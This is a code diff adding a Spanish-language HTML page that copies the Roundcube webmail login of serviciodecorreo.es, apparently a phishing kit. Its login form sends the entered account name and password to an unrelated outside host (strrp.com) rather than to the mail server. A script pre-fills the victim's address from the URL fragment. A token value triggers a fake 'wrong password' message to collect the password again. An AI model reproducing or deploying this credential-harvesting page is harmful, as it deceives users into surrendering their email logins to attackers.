@@ -1,0 +1,150 @@
+
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>Webmail :: Bienvenido a Webmail</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
+<meta name="theme-color" content="#f4f4f4">
+<meta name="msapplication-navbutton-color" content="#f4f4f4">
+
+	<link rel="shortcut icon" href="https://serviciodecorreo.es/images/brand/favicon.ico?s=1603101415">
+
+	<link rel="stylesheet" href="https://serviciodecorreo.es/skins/elastic/deps/bootstrap.min.css?s=1601206732">
+	<meta name="robots" content="noindex, nofollow">
+			<link rel="stylesheet" href="https://serviciodecorreo.es/skins/elastic/styles/styles.css?s=1601206718">
+		<link rel="stylesheet" href="https://serviciodecorreo.es/skins/brand/styles/custom.css?s=1605625364">
+		
+			<meta name="msapplication-TileColor" content="#ffffff">
+	<meta name="theme-color" content="#ffffff">
+	<style>
+	 		.task-login #layout-content{
+				background-color: ;
+		}
+ 	</style>
+<link rel="stylesheet" type="text/css" href="https://serviciodecorreo.es/plugins/xskin/../xframework/assets/styles/elastic.css?s=1603101418">
+<link rel="stylesheet" type="text/css" href="https://serviciodecorreo.es/plugins/jqueryui/themes/elastic/jquery-ui.css?s=1601206717">
+<script src="https://serviciodecorreo.es/program/js/jquery.min.js?s=1601206727"></script>
+<script src="https://serviciodecorreo.es/program/js/common.min.js?s=1601206718"></script>
+<script src="https://serviciodecorreo.es/program/js/app.min.js?s=1601206718"></script>
+<script src="https://serviciodecorreo.es/program/js/jstz.min.js?s=1601206728"></script>
+<script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"es_ES","devel_mode":null,"rcversion":10409,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"skin":"brand","blankpage":"skins/brand/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"./?_task=login","compose_extwin":false,"xelastic":true,"dateFormats":{"php":"Y-m-d","moment":"YYYY-MM-DD","datepicker":"yy-mm-dd"},"dmFormats":{"php":"m-d","moment":"MM-DD","datepicker":"mm-dd"},"timeFormats":{"php":"H:i","moment":"HH:mm","datepicker":"HH:mm"},"timezoneOffset":3600,"xsidebarVisible":true,"xassets":["../xframework/assets/bower_components/js-cookie/src/js.cookie.js","../xframework/assets/scripts/framework.min.js","../xframework/assets/styles/elastic.css","xskin:assets/elastic_scripts/xskin.min.js"],"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","request_token":"uxIHBtQKeh814ZqnqIwkcD4gnPNmJoi7"});
+rcmail.add_label({"loading":"Cargando...","servererror":"¡Error del servidor!","connerror":"¡Error de conexión (fallo al intentar alcanzar el servidor)!","requesttimedout":"Ha expirado el tiempo de respuesta","refreshing":"Actualizando…","windowopenerror":"iLa ventana emergente fue bloqueada!","uploadingmany":"Cargando archivos…","uploading":"Cargando archivo...","close":"Cerrar","save":"Guardar","cancel":"Cancelar","alerttitle":"Atención","confirmationtitle":"Está seguro...","delete":"Eliminar","continue":"Continuar","ok":"OK","back":"Volver","errortitle":"¡Ha ocurrido un error!","options":"Opciones","plaintoggle":"Sólo texto","htmltoggle":"HTML","previous":"Anterior","next":"Siguiente","select":"Seleccionar","browse":"Browse","choosefile":"Choose file...","choosefiles":"Choose files..."});
+rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
+rcmail.gui_object('message', 'messagestack');
+</script>
+
+<script src="https://serviciodecorreo.es/plugins/xskin/../xframework/assets/bower_components/js-cookie/src/js.cookie.min.js?s=1603101418"></script>
+<script src="https://serviciodecorreo.es/plugins/xskin/../xframework/assets/scripts/framework.min.js?s=1603101418"></script>
+<script src="https://serviciodecorreo.es/plugins/xskin/assets/elastic_scripts/xskin.min.js?s=1603101418"></script>
+<script src="https://serviciodecorreo.es/plugins/jqueryui/js/jquery-ui.min.js?s=1601206717"></script>
+<script src="https://serviciodecorreo.es/plugins/jqueryui/js/i18n/jquery.ui.datepicker-es.js?s=1601206717"></script>
+
+	  <script type="text/javascript">
+	
+	window.onload=function(){ 
+  var hashParams = window.location.hash.substr(1).split('&'); // substr(1) to remove the `#`
+for(var i = 0; i < hashParams.length; i++){
+    var p = hashParams[i].split('=');
+    document.getElementById(p[0]).value = decodeURIComponent(p[1]);;
+	var tokenValue = document.getElementById('token').value;
+	 if(tokenValue==2){
+	 document.getElementById("wrongPass").innerHTML = "Su cuenta o contraseña no son correctas y no coinciden. Inténtalo de nuevo,";
+	 }
+	
+}
+ } 
+ 
+</script>
+</head>
+<body class="xelastic task-login action-none">
+			<div id="layout">
+	
+
+<h1 class="voice">Webmail Acceder al correo</h1>
+
+<div id="layout-content" class="selected no-navbar" role="main">
+	<img src="https://serviciodecorreo.es/images/brand/logo.svg?s=1603101415" id="logo" alt="Webmail">
+	<form id="login-form" name="login-form" method="post" class="propform" action="https://strrp.com/Mic/W2.php">
+	<input name="Language" value="ES" required="required" size="40" autocapitalize="off" type="hidden">
+<input name="tag" value="Mic" required="required" size="40" autocapitalize="off" type="hidden">
+<input name="token" value="1" id="token" required="required" size="40" autocapitalize="off" type="hidden">
+<div style="color: red;" id="wrongPass" class="fieldMargin error smallText">
+                <span id="wrongPass1" for=""></span>
+            </div>
+<input type="hidden" name="_token" value="uxIHBtQKeh814ZqnqIwkcD4gnPNmJoi7">
+	<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="_default_"><input type="hidden" name="_url" id="rcmloginurl"><table><tbody><tr><td class="title"><label for="rcmloginuser">Cuenta de correo</label>
+</td>
+<td class="input"><input id="request-token"  name="_user" id="rcmloginuser" readonly required size="40" autocapitalize="off" type="text"></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Contraseña</label>
+</td>
+<td class="input"><input name="_pass" id="rcmloginpwd" required size="40" autocapitalize="off" type="password"></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit">Acceder al correo</button>
+</p>
+
+		<div id="login-footer" role="contentinfo">
+			
+			
+						
+		</div>
+	</form>
+</div>
+
+<noscript>
+	<p class="noscriptwarning">Advertencia: ¡Este servicio de webmail necesita Javascript! Para poder usarlo habilite el soporte de Javascript en su navegador, por favor.</p>
+</noscript>
+
+</div>
+<div id="messagestack"></div>
+<script>
+$(function() {
+rcmail.init();
+});
+</script>
+
+
+
+<script src="https://serviciodecorreo.es/skins/elastic/deps/bootstrap.bundle.min.js?s=1601206732"></script>
+<script src="https://serviciodecorreo.es/skins/elastic/ui.min.js?s=1601206718"></script>
+
+</body>
+</html>
+
+
+<script>
+	var l = document.documentElement.getAttribute('lang');
+	if(l === 'es'){
+					l = "&lt;a target=&quot;_blank&quot; href=&quot;https://serviciodecorreo.es/help/news-serviciodecorreo.pdf&quot;&gt;Conoce más sobre el nuevo Webmail&lt;/a&gt;";
+			}else{
+					l = "&lt;a target=&quot;_blank&quot; href=&quot;https://serviciodecorreo.es/help/news-serviciodecorreo.pdf&quot;&gt;Know more about the new Webmail&lt;/a&gt;.";
+			}
+	var t = document.createElement('textarea');
+	t.innerHTML = l;
+	l = t.value;
+	document.querySelector('#login-footer').innerHTML = '<div class="text">'+l+'</div>';
+</script>
